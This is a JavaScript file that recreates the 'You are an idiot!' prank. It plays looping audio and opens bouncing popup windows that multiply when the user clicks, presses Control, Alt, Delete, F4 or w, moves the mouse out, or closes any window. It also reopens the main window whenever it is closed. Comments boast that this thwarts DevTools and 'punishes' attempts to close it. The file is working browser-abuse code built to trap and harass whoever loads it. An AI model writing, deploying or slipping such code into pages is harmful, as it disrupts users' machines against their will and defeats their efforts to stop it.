// Modern browsers have strict autoplay policies, so the audio needs to be played by the original (unaltered) tab.
// Additionally, the audio needs to be played BEFORE the new tab is opened.

const base64AudioString = "data:audio/mpeg;base64,";

// We need to start the music before a new tab is created.
const origAudioPlayer = document.createElement("audio");
origAudioPlayer.src = base64AudioString;
origAudioPlayer.loop = true;
document.body.appendChild(origAudioPlayer);
origAudioPlayer.play();

function constructChildHTML() {
    const htmlElement = document.createElement("html");

    // Set up the metadata, specifically the title and the favicon.
    const headElement = document.createElement("head");
    const favicon = document.createElement('link');
    favicon.rel = "icon";
    favicon.type = "image/x-icon";
    favicon.href = "data:image/x-icon;base64,";
    headElement.appendChild(favicon);
    const titleElement = document.createElement('title');
    titleElement.textContent = "You are an idiot!";
    htmlElement.appendChild(headElement);
    
    const bodyElement = document.createElement("body");
    bodyElement.style.display = "flex";
    bodyElement.style.justifyContent = "center";
    bodyElement.style.alignItems = "center";
    bodyElement.style.height = "100vh";
    bodyElement.style.margin = "0";
    bodyElement.style.backgroundColor = "#000000";

    // Having a container for the image makes it easier to center it.
    const imageContainer = document.createElement("div");
    imageContainer.style.position = "relative";
    imageContainer.style.width = "100%";
    imageContainer.style.height = "100%";

    const imageElement = document.createElement("img");
    imageElement.src = "data:image/gif;base64,";

    imageElement.style.position = "absolute";
    imageElement.style.width = "100%";
    imageElement.style.height = "100%";
    imageElement.style.objectFit = "contain";
    
    imageContainer.appendChild(imageElement);
    bodyElement.appendChild(imageContainer);
    
    htmlElement.appendChild(bodyElement);
    return htmlElement;
}

function randomRange(min, max) {
	min = Math.ceil(min);
	max = Math.floor(max);
  
	return Math.floor(Math.random() * (max - min + 1) + min);
}

function playBall(targetWindow, xPos, yPos, xOff, yOff) {
    // Randomly bounce the window around the screen
    let newXPos = xPos + xOff;
    let newYPos = yPos + yOff;
    let newXOff = xOff;
    let newYOff = yOff;

    targetWindow.focus();
    
    if (newXPos > screen.width - 320) {
        newXPos = screen.width - 320;
        newXOff = randomRange(-20, -10);
    }
    
    if (newXPos < 0) {
        newXPos = 0;
	    newXOff = randomRange(10, 20);
    }
    
    if (newYPos > screen.height - 240) {
        newYPos = screen.height - 240;
	    newYOff = randomRange(-15, -7.5);
    }
    
    if (newYPos < 0) {
        newYPos = 0;
	    newYOff = randomRange(7.5, 15);
    }
        
    targetWindow.moveTo(newXPos, newYPos);
    setTimeout(playBall.bind(null, targetWindow, newXPos, newYPos, newXOff, newYOff), 7);
}

let childWindows = [];

async function procreate() {
    // Produce six more offspring
    for (let i = 0; i < 6; i++){
        const newOverlapAudio = document.createElement("audio");
        newOverlapAudio.src = base64AudioString;
        newOverlapAudio.loop = true;
        document.body.appendChild(newOverlapAudio);
        newOverlapAudio.play();
        
        const childWindow = window.open(self.location.href, '_blank', 'menubar=no, status=no, toolbar=no, resizable=no, width=320, height=240, titlebar=no, alwaysRaised=yes');
        childWindows.push(childWindow);
        childWindow.onload = () => {
            const childDocument = childWindow.document;    
            childDocument.removeChild(childDocument.getElementsByTagName("html")[0]);
            childDocument.appendChild(constructChildHTML()); // Remove everything. Start anew!

            const startXPos = randomRange(0, screen.width - 320);
            const startYPos = randomRange(0, screen.height - 240);

            // This method guarantees that starting offset for both X and Y won't be too small.
            let startXOff;
            if (Math.random() >= 0.5) { startXOff = randomRange(10, 20);
            } else { startXOff = randomRange(-20, -10); }

            let startYOff;
            if (Math.random() >= 0.5) { startYOff = randomRange(7.5, 15);
            } else { startYOff = randomRange(-15, -7.5); }
            
            playBall(childWindow, startXPos, startYPos, startXOff, startYOff);
        }
        
        childWindow.onclick = procreate;

        childWindow.onkeydown = (event) => {
    	    if (['Control', 'Alt', 'Delete', 'F4', 'w'].includes(event.key)) {
                procreate();
    	    }
        }
        
        await new Promise(res => setTimeout(res, 50));
    }
}

let mainWindow;
function createMainWindow() {
    mainWindow = window.open(self.location.href); // Opening a new tab closes DevTools. No shenanigans :)
    
    mainWindow.onload = () => {
        const mainDocument = mainWindow.document;
    
        mainDocument.removeChild(mainDocument.getElementsByTagName("html")[0]); // Remove everything. Start anew!
        mainDocument.appendChild(constructChildHTML()); // Add the *correct* HTML
    }

    mainWindow.onclick = procreate;
    
    mainWindow.onmouseout = (event) => {
        const mouseX = event.clientX;
        const mouseY = event.clientY;
        if (mouseX > window.viewport_width || mouseX < 0 || mouseY > window.viewport_width || mouseY < 0) { // If the mouse exits the viewport...
            procreate();
        }
    }
    
    mainWindow.onkeydown = (event) => {
        if (['Control', 'Alt', 'Delete', 'F4', 'w'].includes(event.key)) {
            procreate();
        }
    }
}

createMainWindow(); // Fires the program!

const checkChildWindows = setInterval(() => {
    for (let i = 0; i < childWindows.length; i++){
        if (childWindows[i].closed){
            childWindows.splice(i);
            const audioPlayerToRemove = document.getElementsByTagName("audio")[0];
            audioPlayerToRemove.pause();
            document.body.removeChild(audioPlayerToRemove);
            procreate(); // For every child killed, six more will be born!
        }
    }
}, 50);

const checkMainWindow = setInterval(() => {
    if (mainWindow.closed) {
        createMainWindow();
        procreate(); // Punishment for trying to close it >:)
    }
}, 50);